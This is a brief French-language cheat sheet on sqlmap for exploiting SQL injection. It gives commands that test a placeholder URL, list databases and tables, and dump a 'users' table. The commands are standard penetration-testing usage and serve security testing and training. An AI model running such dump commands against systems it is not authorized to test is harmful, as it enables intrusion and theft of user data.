# SQLmap – Exploitation SQL Injection

## 🎯 Objectif
Automatiser l’exploitation des failles SQLi.

## 🔧 Test simple
sqlmap -u "http://target.com/page.php?id=1"

## 🔎 Lister bases
sqlmap -u URL --dbs

## 🔎 Lister tables
sqlmap -u URL -D dbname --tables

## 🔎 Dump données
sqlmap -u URL -D dbname -T users --dump

## 📌 Supporte
MySQL, PostgreSQL, MSSQL, Oracle...